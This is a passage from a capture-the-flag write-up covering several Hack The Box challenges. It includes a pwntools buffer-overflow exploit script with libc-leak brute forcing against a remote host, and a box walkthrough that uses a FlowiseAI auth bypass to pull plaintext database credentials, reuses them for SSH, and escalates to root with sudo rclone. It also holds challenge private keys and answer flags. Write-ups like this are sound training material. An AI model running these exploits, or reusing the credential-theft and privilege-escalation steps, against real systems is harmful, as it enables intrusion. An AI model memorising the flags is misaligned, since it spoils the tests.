  v13 = std::ostream::operator<<(v12, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(v13, &unk_404128);
  LODWORD(v14) = strcspn(buf, "\n");
  buf[v14] = 0;
  ...
```

The age buffer is 256 bytes long, but only 32 bytes are read, using the `read` function which doesn't null-terminate the string, and is printed as it to the screen via `<<`, after which is being null-terminated. This operations means that if we don't fill the buffer entirely, it will start printing data from the stack as well, giving us possible address leaks. Experimenting with various offsets, we get that at sending 7 characters, we get a 48 bits address, which seems to reside in the `rw-p` section of libc. Using our debugger, we can offset that to libc base and ensure it is consistent, which it is. Our leak has offset `0x201ee0` to libc base. Using our newly acquired libc base, we can now execute our one_gadget (all conditions are already pre-satisfied - the journey function ends in `xor rbx, rbx; xor rcx, rcx` thus making `rbx == null, rcx == null`, and `rsp` is correctly aligned, thus `rsp & 0xf == 0`). By sending 40 As (8 bytes for v8, 8 for v9, 8 for v10, 8 for v11, then 8 for RBP) and our one_gadget address, we get the shell.

It's time to test it remotely and get the flag.

Unless...
Remotely, the libc leak isn't located at the same offset on the stack, as the stack layout is somewhat shifted. We have two 0x7f address leaks, one seems to be the stack at 15 characters (it was like 0x7fff...), and the other seems to be a libc address, but the offset to libc base seems to be completely wrong, as the result is completely misaligned to any boundaries (4kb = 0x1000 or 2mb = 0x200000).
I fiddle around a bit with various offsets to libc, trying to match what I was seeing locally with what was remote, but to no avail. Since I assumed that the address had to be somewhere from libc, I decided to try to brute force the libc base from the leak, by aligning the leaked address first to a 4kb boundary, and then going in 0x1000 steps down, until the exploit worked and I got something.

Tidying up some small flaws in the script, we get the final version which got the flag in the end, with the leak at offset `0x93bca` from libc base.

```Python
from pwn import *
context.arch = 'amd64'
#context.log_level = 'debug'

def create_profile_with_leak(p):
    p.sendlineafter(b'$', b'1')
    p.sendlineafter(b'Name:  ', b'AAAA')
    p.sendlineafter(b'Class: ', b'BBBB')
    age = b'C' * 23
    p.sendlineafter(b'Age:   ', age)
    data = p.recvuntil(b'Create', drop=True)
    return data

def parse_libc_leak(leak_data):
    try:
        idx = leak_data.rindex(b'CCCCCC\n')
        leak = leak_data[idx + 7:idx + 7 + 6]
        print("----------------")
        print(leak)
        print("----------------")
        addr = u64(leak.ljust(8, b'\x00'))
        return addr
    except Exception as e:
        print(e)
        return None

def get_libc_base(addr):
    return (addr) & ~(0x1000 - 1)

def trigger_overflow(p, libc_base):
    one_gadget = libc_base + 0x583e3
    p.sendlineafter(b'$ ', b'3')
    payload = flat(
        b"A" * 40,
        one_gadget
    )
    p.sendlineafter(b'mission: ', payload)

def exploit(offset):
    #p = process('./recruitment')
    p = remote("94.237.55.109", 31827)   
    leak_data = create_profile_with_leak(p)
    libc_addr = parse_libc_leak(leak_data)
    if libc_addr:
        log.success(f"Leaked libc address: {hex(libc_addr)}")
        libc_base = get_libc_base(libc_addr) - offset
        if "0x7f" not in hex(libc_base):
            p.close()
            return exploit(offset)
        log.success(f"Calculated libc base: {hex(libc_base)}")
        trigger_overflow(p, libc_base)
        p.sendline(b'cat flag*')
        print("offset", offset)
        try:
            s = p.recv()
        except:
            p.close()
            return
        print("recv ", s)
        print("!!!!!good off ", offset)
        p.close()
        exit(0)
            
    else:
        log.failure("Failed to get libc leak")
        p.close()

if __name__ == '__main__':
    for i in range(0, 0x208000, 0x1000):
        exploit(i)
```

FLAG: `HTB{R34dy_0R_n0t_w3_4r3_c0m1ng_37b2abbdf122420a4112272d10d8b476}`

# Fullpwn

## Apolo

By scanning the ports, we see both 80 and 443, which indicate a HTTP server.
Opening that up, we are greeted with a webpage, without much on it. On the sentinel tab, we get another link (requires modification of hosts to fix the name resolutions to that given IP). On that webpage (`ai.apolo.htb`), we are presented with with a login form, and some information about what is behind. They are using FlowiseAI. Testing simple credentials, they don't seem to work, so I started looking into an auth bypass. I reached this `https://www.exploit-db.com/exploits/52001`, which seems to work in our case, and we can run `api` queries unrestricted and unauthenticated.

Seeing as how on the page we see a tab `Credentials`, we try to query that (`C:\Windows\System32\curl.exe -v  http://ai.apolo.htb/Api/v1/credentials)`, and get the following response `[{"id":"6cfda83a-b055-4fd8-a040-57e5f1dae2eb","name":"MongoDB","credentialName":"mongoDBUrlApi","createdDate":"2024-11-14T09:02:56.000Z","updatedDate":"2024-11-14T09:02:56.000Z"}]`. Thus, moving further, we try to list that credential via `C:\Windows\System32\curl.exe -v  http://ai.apolo.htb/Api/v1/credentials/6cfda83a-b055-4fd8-a040-57e5f1dae2eb`, and we get the following: `{"id":"6cfda83a-b055-4fd8-a040-57e5f1dae2eb","name":"MongoDB","credentialName":"mongoDBUrlApi","createdDate":"2024-11-14T09:02:56.000Z","updatedDate":"2024-11-14T09:02:56.000Z","plainDataObj":{"mongoDBConnectUrl":"mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true&w=majority"}}`. We see there an interesting MongoDB connection string. I struggled with it a bit, tried connecting via MongoDB compass or PyMongo, but it was giving me a DNS error. Thus, I thought I could try to use ssh to tunnel the MongoDB from the victim machine to mine, and lo and behold, using `ssh` with those credentials worked, and we get the user flag from `user.txt`.

For the root flag, I started looking for setuid binaries (`find / -perm 4000 2>/dev/null`), and looked around a bit to see if we can get something. Also inspected the file system for some files, but nothing popped out. Then, I tried to see whether we had sudo permissions for something (`sudo -l`), and we do, for `/usr/bin/rclone`. Inspecting what `rclone` is, we see we can use it to get copy files from different locations. As such, with the `sudo` permissions, we should be able to get the output of commands on `/root` folder.

Running `sudo rclone ls /root` and then `sudo rclone cat /root/root.txt`, yields the flag.

USER FLAG: `HTB{llm_ex9l01t_4_RC3}`
ROOT FLAG: `HTB{cl0n3_rc3_f1l3}`

# Coding

## Exclusivity

Remove duplicate ints from string.

```Python
n = input()
x = set()
res = []
n = n.split()
for l in n:
    if l not in x:
        x.add(l)
        res.append(l)

print(' '.join(res))
```

FLAG: `HTB{r3m0v1ng_dup5_15_s0_345y_1F_y0u_kn0w_h0w_t0_c0d3!_bd34e4f3fe901f4d8ae689f9a73d2e73}`

## Conflict Cruncher

Merge two dictionaries

```Python
import ast
dict1_str = ast.literal_eval(input())
dict2_str = ast.literal_eval(input())
print({**dict1_str, **dict2_str})
```

FLAG: `HTB{n0w_1m_0ff1c4lly_4_c0nfl1ct_crunch3r_y4y!_3add111c715b6c9da23bf64facf7e1aa}`

## Energy Crystals

Solve combination sum problem with repetitions.

```Python
import ast
energy_crystals = ast.literal_eval(input())
target_energy = int(input())

def combinationSum(candidates, target):
    def backtrack(remaining, combination, start):
        if remaining == 0:
            result.append(list(combination))
            return
        if remaining < 0:
            return

        for i in range(start, len(candidates)):
            combination.append(candidates[i])
            backtrack(remaining - candidates[i], combination, i)
            combination.pop()

    result = []
    backtrack(target, [], 0)
    return result

res = combinationSum(energy_crystals, target_energy)

print(len(res))

```

FLAG: `HTB{3n34gy_m4tr1x_act1v4t3d_w3_4r3_s4v3d!_c8d39afda75aeebcb635e6d4467006ee}`

## Word Wrangler

Find word with highest frequency regardless of punctiation.

```Python
input_text = input()
input_text = [x.lower().strip('.').strip('!').strip('?').strip("'").strip('"') for x in input_text.split()]
res = {}
for word in input_text:
    if word in res:
        res[word] += 1
    else:
        res[word] = 1
print(max(res, key=res.get))
```

FLAG: `HTB{pfupp_wh0_m4d3_th353_345y_ch4ll3ng35_ch1ld1sh!_99c6caba7d033c4aa365a2b6070baed2}`

## Weighted Starfield

Max contiguous subarray product value.

```Python
import ast
from itertools import combinations
signals = ast.literal_eval(input())
weights = ast.literal_eval(input())
sig = [signals[i] * weights[i] for i in range(len(signals))]
def max_product_subarray(nums):
    max_so_far = nums[0]
    min_so_far = nums[0]
    result = nums[0]

    for i in range(1, len(nums)):
        current = nums[i]
        temp_max = max(current, max_so_far * current, min_so_far * current)
        min_so_far = min(current, max_so_far * current, min_so_far * current)
        max_so_far = temp_max
        result = max(result, max_so_far)

    return result
print(max_product_subarray(sig))
```

FLAG: `HTB{m1ssi0n_c0mpl3t3d_m4x1mum_5t4b1l1ty_4ch13v3d!_e7ee29b8d99171878ac5a5e05ccafcb2}`

# Warmup

## Welcome to CTF

FLAG: `HTB{onboard1ng_fl4g}`

# Blockchain

## CryoPod

We are given two solidity files, one for the setup contract which provides the isSolved solution, and one for the CryoPod contract, which just has a function for storing data and emitting an event when that data was stored. I tried deploying these the contracts on a local network and interact with them, but nothing really popped out. Then, I tried interacting with them via `NodeJS` to see if storing some data would change something, but it didn't. I then registered a listener for the events emitted in the CryoPod contract, and voila, got multiple events being triggered, and one of them had the flag.

```JavaScript
const ethers = require('ethers');

const RPC_URL = "http://94.237.50.250:42079";
const PRIVATE_KEY = "3b6bae97b760b2e866b9442baadd01d6e974778bda4f073e1d62baa204173a73";
const PLAYER_ADDRESS = "0x3bcebC7D72763BfF110c00a9e94225e8c63edfBE";
const TARGET_ADDRESS = "0x00F0eFAb560c117D8Afdf727D0020F30064a2755";
const SETUP_ADDRESS = "0x45dCE6F8672BD1fDe78A8ee58B1BEB78c95D24c9";

const CRYOPOD_ABI = [
            {
                "anonymous": false,
                "inputs": [
                    {
                        "indexed": true,
                        "internalType": "address",
                        "name": "user",
                        "type": "address"
                    },
                    {
                        "indexed": false,
                        "internalType": "string",
                        "name": "data",
                        "type": "string"
                    }
                ],
                "name": "PodStored",
                "type": "event"
            },
            {
                "inputs": [
                    {
                        "internalType": "string",
                        "name": "_data",
                        "type": "string"
                    }
                ],
                "name": "storePod",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

const SETUP_ABI = [
            {
                "inputs": [],
                "stateMutability": "payable",
                "type": "constructor"
            },
            {
                "anonymous": false,
                "inputs": [
                    {
                        "indexed": false,
                        "internalType": "address",
                        "name": "at",
                        "type": "address"
                    }
                ],
                "name": "DeployedTarget",
                "type": "event"
            },
            {
                "inputs": [],
                "name": "TARGET",
                "outputs": [
                    {
                        "internalType": "contract CryoPod",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "flagHash",
                "outputs": [
                    {
                        "internalType": "bytes32",
                        "name": "",
                        "type": "bytes32"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "string",
                        "name": "flag",
                        "type": "string"
                    }
                ],
                "name": "isSolved",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ];

async function main() {
    try {
        const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
        const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
        const cryoPod = new ethers.Contract(TARGET_ADDRESS, CRYOPOD_ABI, wallet);
        const setup = new ethers.Contract(SETUP_ADDRESS, SETUP_ABI, wallet);

        const flagHash = await setup.flagHash();
        console.log("Flag Hash:", flagHash);

        cryoPod.on("PodStored", (user, data) => {
            console.log("Pod Stored Event:");
            console.log("User:", user);
            console.log("Data:", data);
        });

        console.log("Attempting to store a pod...");
        const tx = await cryoPod.storePod("test data");
        await tx.wait();
        console.log("Pod stored successfully!");

    } catch (error) {
        console.error("Error:", error);
    }
}

main();
```

FLAG: `HTB{h3ll0_ch41n_sc0ut3r}`

## ForgottenArtifact

We are again given 2 solidity contracts, Setup.sol and ForgottenArtifact.sol. The setup sol just creates a ForgottenArtifact contract and provides the win condition, namely that the `lastSighting` attribute in the target contract is bigger than the initial deployment timestamp. The ForgottenArtifact contract stores the artifact at a location based on a generated seed. The seed is generated from the keccak256 hash of encoding the block's number, timestamp and the message sender.

By getting the last block in the blockchain and recreating the seed the way it is done in the contract, we can get "discover" the artifact again, and increase the `lastSighting` value, thus getting the flag.

```JavaScript
const { ethers } = require('ethers');

const RPC_URL = "http://94.237.50.83:39425";
const TARGET_ADDRESS = "0x476e8B87fd996e717F30adb28e5f1FeBBf12f7Fe";
const SETUP_ADDRESS = "0x2F4d90E0d31d0f013ec27e17B3bc01f448BAFF5e";
const PRIVATE_KEY = "3292a1ce8ef597cf414d0922addad8cc8ed84ac0606b05307ac9195e31b73574";
const PLAYER_ADDRESS = "0xB83A8db64F26F7EB935deBC6252Bef52Bc9DF7e4";

const FORGOTTEN_ARTIFACT_ABI = [
            {
                "inputs": [
                    {
                        "internalType": "uint32",
                        "name": "_origin",
                        "type": "uint32"
                    },
                    {
                        "internalType": "address",
                        "name": "_discoverer",
                        "type": "address"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "ARTIFACT_ORIGIN",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "bytes32",
                        "name": "_artifactLocation",
                        "type": "bytes32"
                    }
                ],
                "name": "discover",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "lastSighting",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ];

async function exploit() {
    try {
        const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
        const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
        const contract = new ethers.Contract(TARGET_ADDRESS, FORGOTTEN_ARTIFACT_ABI, wallet);

        const deployBlock = await provider.getBlock('latest');
        const packedData = ethers.utils.solidityPack(
            ['uint256', 'uint256', 'address'],
            [deployBlock.number, deployBlock.timestamp, SETUP_ADDRESS]
        );
        const deploymentData = ethers.utils.keccak256(packedData);
        const overrides = {
            gasLimit: 200000  // manual gas limit for avoiding errors
        };

        console.log("Sending transaction...");
        console.log("Using artifact location:", deploymentData);
        const tx = await contract.discover(deploymentData, overrides);

        console.log("Waiting for transaction to be mined...");
        const receipt = await tx.wait();
        
        console.log(`Transaction successful! Hash: ${receipt.hash}`);
        return receipt;
        
    } catch (error) {
        console.error("Error during exploit:", error);
        if (error.error && error.error.reason) {
            console.error("Reason:", error.error.reason);
        }
    }
}

exploit().catch(console.error);
```
FLAG: `HTB{y0u_c4n7_533_m3}`